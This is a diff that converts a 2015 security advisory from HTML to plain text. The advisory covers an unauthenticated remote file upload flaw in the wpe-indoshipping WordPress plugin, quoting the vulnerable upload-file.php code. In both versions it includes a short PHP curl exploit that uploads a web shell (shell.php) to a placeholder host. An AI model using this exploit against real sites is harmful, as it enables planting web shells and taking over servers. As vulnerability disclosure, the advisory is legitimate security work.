@@ -1,33 +1,42 @@
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
-"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml">
-<head>
-<title></title>
-<meta name="generator" content="HTML::TextToHTML v2.51"/>
-</head>
-<body>
-<p>&lt;html&gt;&lt;title&gt;Vulnerability&lt;/title&gt;&lt;head&gt; &lt;style type="text/css"&gt;&lt;!-- A {text-decoration:none} --&gt;div {
-</p><p>    white-space: pre-wrap;      /* CSS3 <em>/
-    white-space: -moz-pre-wrap; /</em> Firefox <em>/
-    white-space: -pre-wrap;     /</em> Opera &lt;7 <em>/
-    white-space: -o-pre-wrap;   /</em> Opera 7 */
-    word-wrap: break-word;<br/>
-}&lt;/style&gt;&lt;/head&gt;&lt;body alink="<strong>EE0000" link="</strong>0000EE" bgcolor="#333333" text="#000000" vlink="#551A8B"&gt;&lt;center&gt;&lt;table border="0" cellpadding="2" cellspacing="2" width="70%"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style="background-color:rgb(150,200,200);font-weight: bold;"&gt;&lt;center&gt;Advisory #: 145&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Title:&lt;/b&gt; Remote file upload vulnerability in wpe-indoshipping v2.5.0 wordpress plugin [Previously Discovered]&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Author: &lt;/b&gt;Larry W. Cashdollar, @_larry0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Date:&lt;/b&gt; 2015-07-13&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Download Site:&lt;/b&gt; &lt;a href="<a href="https://wordpress.org/plugins/wpe-indoshipping">https://wordpress.org/plugins/wpe-indoshipping</a>"&gt;<a href="https://wordpress.org/plugins/wpe-indoshipping&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td">https://wordpress.org/plugins/wpe-indoshipping&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</a> style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor: &lt;/b&gt;<a href="http://www.balitechy.com/&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td">http://www.balitechy.com/&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</a> style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Notified: &lt;/b&gt; 2015-07-13&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Contact:&lt;/b&gt;  ekaputra[at]balitechy.com&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Description:&lt;/b&gt; &lt;span style="color: rgb(0, 0, 0); font-family: Times; font-size: medium; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: normal; orphans: auto; text-align: start; text-indent: 0px; text-transform: none; white-space: pre-wrap; widows: auto; word-spacing: 0px; -webkit-text-stroke-width: 0px; display: inline !important; float: none;"&gt;Indonesian shipping special plugins to integrate with the plugin WP - Ecommerce.
-The final test at the WP - Ecommerce version <a href="telnet://3.8.11.1">3.8.11.1</a>
-With WPE Indoshipping then you can display a list of postage per area in Indonesia that you choose .
-Suitable to display a list of postage from JNE , TIKI or the other and will directly affect the value of your order .&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vulnerability:&lt;/b&gt;&lt;div&gt;The ./wpe-indoshipping/admin/upload-file.php doesn&amp;#039;t validate the users ability to upload files or the type of file being uploaded. 
-</p><p> 1 &amp;lt;?php<br/>
-  2 $upload_path = $<u>POST[&amp;#039;upload</u>path&amp;#039;];
-  3 $filename = $<u>FILES[&amp;quot;uploadfile&amp;quot;][&amp;quot;name&amp;quot;];
-  4 if (move</u>uploaded_file($<u>FILES[&amp;#039;uploadfile&amp;#039;][&amp;#039;tmp</u>name&amp;#039;], $upload_path.$filename)) {
-  5     echo $filename;<br/>
-  6 } else {<br/>
-  7         echo &amp;#039;error&amp;#039;;<br/>
-  8 }<br/>
-  9 ?&amp;gt;
-</p><p>The attacker will need to guess the path to a writeable directory in the web servers root.&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;CVE-&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;JSON:&lt;/b&gt;&lt;a href="json.php?s=145"&gt; Export&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Exploit Code:&lt;/b&gt;&lt;div&gt;&lt;pre class="php" style="font-family:monospace;"&gt;&lt;ol&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;        &lt;span style="color: #000000; font-weight: bold;"&gt;&amp;lt;?php&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;          &lt;span style="color: #000088;"&gt;$uploadfile&lt;/span&gt;&lt;span style="color: #339933;"&gt;=&lt;/span&gt;&lt;span style="color: #0000ff;"&gt;&amp;quot;/var/www/shell.php&amp;quot;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;         &lt;span style="color: #000088;"&gt;$ch&lt;/span&gt; &lt;span style="color: #339933;"&gt;=&lt;/span&gt; &lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;          &lt;a href="<a href="http://www.php.net/curl_init">http://www.php.net/curl_init</a>"&gt;&lt;span style="color: #990000;"&gt;curl_init&lt;/span&gt;&lt;/a&gt;&lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;span style="color: #0000ff;"&gt;&amp;quot;<a href="http://example.com/upload-file.php&amp;quot;&lt;/span&gt;&lt;span">http://example.com/upload-file.php&amp;quot;&lt;/span&gt;&lt;span</a> style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;          &lt;a href="<a href="http://www.php.net/curl_setopt">http://www.php.net/curl_setopt</a>"&gt;&lt;span style="color: #990000;"&gt;curl_setopt&lt;/span&gt;&lt;/a&gt;&lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;span style="color: #000088;"&gt;$ch&lt;/span&gt;&lt;span style="color: #339933;"&gt;,&lt;/span&gt; CURLOPT_POST&lt;span style="color: #339933;"&gt;,&lt;/span&gt; &lt;span style="color: #009900; font-weight: bold;"&gt;true&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;           &lt;a href="<a href="http://www.php.net/curl_setopt">http://www.php.net/curl_setopt</a>"&gt;&lt;span style="color: #990000;"&gt;curl_setopt&lt;/span&gt;&lt;/a&gt;&lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;span style="color: #000088;"&gt;$ch&lt;/span&gt;&lt;span style="color: #339933;"&gt;,&lt;/span&gt; CURLOPT_POSTFIELDS&lt;span style="color: #339933;"&gt;,&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;                   &lt;a href="<a href="http://www.php.net/array">http://www.php.net/array</a>"&gt;&lt;span style="color: #990000;"&gt;array&lt;/span&gt;&lt;/a&gt;&lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;span style="color: #0000ff;"&gt;'uploadfile'&lt;/span&gt;&lt;span style="color: #339933;"&gt;=&amp;gt;&lt;/span&gt;&lt;span style="color: #0000ff;"&gt;&amp;quot;@&lt;span style="color: #006699; font-weight: bold;"&gt;$uploadfile&lt;/span&gt;&amp;quot;&lt;/span&gt;&lt;span style="color: #339933;"&gt;,&lt;/span&gt;&lt;span style="color: #0000ff;"&gt;'upload_path'&lt;/span&gt;&lt;span style="color: #339933;"&gt;=&amp;gt;&lt;/span&gt;&lt;span style="color: #0000ff;"&gt;'/usr/share/wordpress/wp-content/uploads/'&lt;/span&gt;&lt;span style="color: #339933;"&gt;,&lt;/span&gt;&lt;span style="color: #0000ff;"&gt;'name'&lt;/span&gt;&lt;span style="color: #339933;"&gt;=&amp;gt;&lt;/span&gt;&lt;span style="color: #0000ff;"&gt;'shell.php'&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;      &lt;a href="<a href="http://www.php.net/curl_setopt">http://www.php.net/curl_setopt</a>"&gt;&lt;span style="color: #990000;"&gt;curl_setopt&lt;/span&gt;&lt;/a&gt;&lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;span style="color: #000088;"&gt;$ch&lt;/span&gt;&lt;span style="color: #339933;"&gt;,&lt;/span&gt; CURLOPT_RETURNTRANSFER&lt;span style="color: #339933;"&gt;,&lt;/span&gt; &lt;span style="color: #cc66cc;"&gt;1&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;         &lt;span style="color: #000088;"&gt;$postResult&lt;/span&gt; &lt;span style="color: #339933;"&gt;=&lt;/span&gt; &lt;a href="<a href="http://www.php.net/curl_exec">http://www.php.net/curl_exec</a>"&gt;&lt;span style="color: #990000;"&gt;curl_exec&lt;/span&gt;&lt;/a&gt;&lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;span style="color: #000088;"&gt;$ch&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;     &lt;a href="<a href="http://www.php.net/curl_close">http://www.php.net/curl_close</a>"&gt;&lt;span style="color: #990000;"&gt;curl_close&lt;/span&gt;&lt;/a&gt;&lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;span style="color: #000088;"&gt;$ch&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;           &lt;span style="color: #b1b100;"&gt;print&lt;/span&gt; &lt;span style="color: #0000ff;"&gt;&amp;quot;&lt;span style="color: #006699; font-weight: bold;"&gt;$postResult&lt;/span&gt;&amp;quot;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;     &lt;span style="color: #000000; font-weight: bold;"&gt;?&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Screen Shots:&lt;/b&gt; &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Advisory:&lt;/b&gt; &lt;a href=""&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt;
-&lt;/html&gt;
-</p>
-
-</body>
-</html>
+                                Advisory #: 145
+Title: Remote file upload vulnerability in wpe-indoshipping v2.5.0 wordpress
+plugin [Previously Discovered]
+Author:Larry W. Cashdollar, @_larry0
+Date: 2015-07-13
+Download Site: https://wordpress.org/plugins/wpe-indoshipping
+Vendor:http://www.balitechy.com/
+Vendor Notified: 2015-07-13
+Vendor Contact: ekaputra[at]balitechy.com
+Description: Indonesian shipping special plugins to integrate with the plugin
+WP - Ecommerce. The final test at the WP - Ecommerce version 3.8.11.1 With WPE
+Indoshipping then you can display a list of postage per area in Indonesia that
+you choose . Suitable to display a list of postage from JNE , TIKI or the other
+and will directly affect the value of your order .
+Vulnerability:
+The ./wpe-indoshipping/admin/upload-file.php doesn't validate the users ability
+to upload files or the type of file being uploaded. 1 <?php 2 $upload_path =
+$_POST['upload_path']; 3 $filename = $_FILES["uploadfile"]["name"]; 4 if
+(move_uploaded_file($_FILES['uploadfile']['tmp_name'], $upload_path.$filename))
+{ 5 echo $filename; 6 } else { 7 echo 'error'; 8 } 9 ?> The attacker will need
+to guess the path to a writeable directory in the web servers root.
+CVE-
+JSON:Export
+Exploit Code:
+   1.      	<?php
+   2.  
+   3.      	$uploadfile="/var/www/shell.php";
+   4.      	$ch =
+   5.      	curl_init("http://example.com/upload-file.php");
+   6.      	curl_setopt($ch, CURLOPT_POST, true);
+   7.      	curl_setopt($ch, CURLOPT_POSTFIELDS,
+   8.      	         array('uploadfile'=>"@$uploadfile",'upload_path'=>'/usr/
+      share/wordpress/wp-content/uploads/','name'=>'shell.php'));
+   9.      	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+  10.     	$postResult = curl_exec($ch);
+  11.     	curl_close($ch);
+  12.     	print "$postResult";
+  13.  
+  14.     	?>
+  15.  
+Screen Shots:
+Advisory:
